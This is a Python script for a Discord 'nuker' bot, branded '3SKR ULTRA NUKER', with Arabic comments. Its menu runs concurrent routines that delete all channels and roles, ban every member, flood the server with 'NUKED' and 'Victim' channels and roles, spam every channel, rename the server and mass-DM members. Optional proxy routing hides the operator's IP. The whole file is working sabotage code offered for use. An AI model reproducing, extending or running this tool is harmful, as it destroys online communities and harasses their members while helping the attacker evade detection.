import discord
import asyncio
import sys
import random
import time
import os
from discord.ext import commands
from aiohttp_proxy import ProxyConnector # يتطلب تثبيت: pip install aiohttp-proxy

# إعدادات الصلاحيات
intents = discord.Intents.all()
client = commands.Bot(command_prefix="!", intents=intents, help_command=None)

guild_target = None
running = True
cnt = {"v": 0}
chan_list = ["3SKR-NUKED", "REKT-BY-3SKR", "OWNED-BY-3SKR"]
role_list = ["3SKR-Victim", "3SKR-Owned", "3SKR-Lvl0"]

# اللون الأحمر الدموي فقط
R = "\033[91m" 
X = "\033[0m"

@client.event
async def on_ready():
    global guild_target
    os.system("cls || clear")
    banner()
    
    guilds = list(client.guilds)
    print(f"\n{R}[>] LOGGED AS : {client.user}{X}")
    print(f"{R}============================================================{X}")
    
    for i, g in enumerate(guilds):
        print(f"{R}  [{i+1}] {g.name} ({g.id}){X}")
    
    while True:
        try:
            ch = int(input(f"\n{R}[>] SELECT SERVER : {X}")) - 1
            if 0 <= ch < len(guilds):
                guild_target = guilds[ch]
                break
        except: pass
    
    os.system("cls || clear")
    show_target()
    await show_menu()

def banner():
    print(f"""{R}
██████╗ ██████╗ ██████╗ ██████╗ 
╚════██╗██╔═══██╗██╔══██╗██╔══██╗
 █████╔╝██║   ██║██████╔╝██████╔╝
 ╚═══██╗██║   ██║██╔═══╝ ██╔══██╗
██████╔╝╚██████╔╝██║     ██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝
{R}============================================================{X}
{R}  DEVELOPER : 3SKR {X}
{R}  TOOL      : ULTRA NUKER (PROXY PROTECTED){X}
{R}============================================================{X}
    """)

def show_target():
    print(f"""{R}
  TARGET : {guild_target.name}{X}
  ID      : {guild_target.id}{X}
{R}============================================================{X}
    """)

async def show_menu():
    global running
    while running:
        print(f"""{R}
┌──────────────────────────────────────────────────────────┐
│              3SKR ULTRA NUKER - MENU                      │
│                                                          │
│           [1]  MASS DELETE CHANNELS (ULTRA FAST)         │
│           [2]  MASS DELETE ROLES (ULTRA FAST)             │
│           [3]  BAN ALL MEMBERS (ASYNC)                    │
│           [4]  MASS CREATE CHANNELS (FLOOD)               │
│           [5]  MASS CREATE ROLES (FLOOD)                  │
│           [6]  SPAM ALL CHANNELS (FLOOD)                  │
│           [7]  CHANGE SERVER NAME                        │
│           [8]  DM ALL MEMBERS (FAST)                      │
│           [0]  EXIT                                      │
└──────────────────────────────────────────────────────────┘
        {X}""")
        
        try:
            c = input(f"{R}[>] OPTION : {X}").strip()
        except: c = ""
        
        if c == "1": await del_chans()
        elif c == "2": await del_roles()
        elif c == "3": await ban_all()
        elif c == "4": await create_chans()
        elif c == "5": await create_roles()
        elif c == "6": await spam_all()
        elif c == "7": await change_name()
        elif c == "8": await dm_all()
        elif c == "0":
            running = False
            await client.close()
            os._exit(0)

# --- الدوال السريعة جداً (Async Parallel) ---

async def del_chans():
    cnt["v"] = 0
    start = time.time()
    tasks = [asyncio.create_task(delete_channel(ch)) for ch in guild_target.channels]
    await asyncio.gather(*tasks)
    print(f"\n{R}[+] {cnt['v']} CHANNELS DESTROYED [{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def delete_channel(ch):
    try:
        await ch.delete()
        cnt["v"] += 1
        print(f"{R}[+] DELETED: {ch.name}{X}")
    except: pass

async def del_roles():
    cnt["v"] = 0
    start = time.time()
    roles = [r for r in guild_target.roles if r.name != "@everyone"]
    tasks = [asyncio.create_task(delete_role(r)) for r in roles]
    await asyncio.gather(*tasks)
    print(f"\n{R}[+] {cnt['v']} ROLES DESTROYED [{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def delete_role(r):
    try:
        await r.delete()
        cnt["v"] += 1
        print(f"{R}[+] DELETED: {r.name}{X}")
    except: pass

async def ban_all():
    cnt["v"] = 0
    start = time.time()
    await guild_target.fetch_members()
    tasks = [asyncio.create_task(ban_member(m)) for m in guild_target.members if m.id != client.user.id]
    await asyncio.gather(*tasks)
    print(f"\n{R}[+] {cnt['v']} MEMBERS BANNED [{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def ban_member(m):
    try:
        await m.ban(reason="3SKR")
        cnt["v"] += 1
        print(f"{R}[+] BANNED: {m.name}{X}")
    except: pass

async def create_chans():
    try: n = int(input(f"{R}[>] AMOUNT : {X}"))
    except: return
    cnt["v"] = 0
    start = time.time()
    tasks = [asyncio.create_task(guild_target.create_text_channel(random.choice(chan_list))) for i in range(n)]
    await asyncio.gather(*tasks)
    print(f"\n{R}[+] {cnt['v']} CHANNELS FLOODED [{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def create_roles():
    try: n = int(input(f"{R}[>] AMOUNT : {X}"))
    except: return
    cnt["v"] = 0
    start = time.time()
    tasks = [asyncio.create_task(guild_target.create_role(name=random.choice(role_list), color=discord.Color.random())) for i in range(n)]
    await asyncio.gather(*tasks)
    print(f"\n{R}[+] {cnt['v']} ROLES FLOODED [{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def spam_all():
    try: per = int(input(f"{R}[>] MSG PER CHANNEL : {X}"))
    except: return
    msg = input(f"{R}[>] MESSAGE : {X}")
    cnt["v"] = 0
    start = time.time()
    chs = guild_target.text_channels
    tasks = []
    for ch in chs:
        for i in range(per):
            tasks.append(asyncio.create_task(ch.send(msg)))
    await asyncio.gather(*tasks)
    print(f"\n{R}[+] {cnt['v']} MESSAGES SPAMMED [{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def change_name():
    name = input(f"{R}[>] NEW NAME : {X}")
    try: await guild_target.edit(name=name); print(f"{R}[+] NAME CHANGED TO: {name}{X}")
    except Exception as e: print(f"{R}[-] FAILED: {e}{X}")
    input(f"{R}[>] ENTER{X}")

async def dm_all():
    msg = input(f"{R}[>] MESSAGE : {X}")
    cnt["v"] = 0
    start = time.time()
    await guild_target.fetch_members()
    tasks = [asyncio.create_task(send_dm(m, msg)) for m in guild_target.members if m.id != client.user.id]
    await asyncio.gather(*tasks)
    print(f"\n{R}[+] {cnt['v']} DMS SENT [{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def send_dm(m, msg):
    try: await m.send(msg); cnt["v"] += 1; print(f"{R}[+] SENT TO: {m.name}{X}")
    except: pass

# --- تشغيل البوت مع نظام البروكسي ---

while True:
    token = input(f"\n{R}[>] TOKEN : {X}").strip()
    if token: break

# إعداد البروكسي
proxy_url = input(f"{R}[>] PROXY (http://ip:port) OR ENTER FOR NO PROXY : {X}").strip()

if proxy_url:
    # استخدام ProxyConnector لربط البوت بالبروكسي وتغيير الـ IP
    connector = ProxyConnector.from_url(proxy_url)
    try:
        client.run(token, reconnect=True, http_connector=connector)
    except Exception as e:
        print(f"{R}[-] PROXY ERROR: {e}{X}")
        os._exit(0)
else:
    try:
        client.run(token, reconnect=True)
    except:
        os.system("cls || clear")
        banner()
        print(f"{R}[-] INVALID TOKEN OR ERROR{X}")
        time.sleep(2)
        os.execl(sys.executable, sys.executable, *sys.argv)
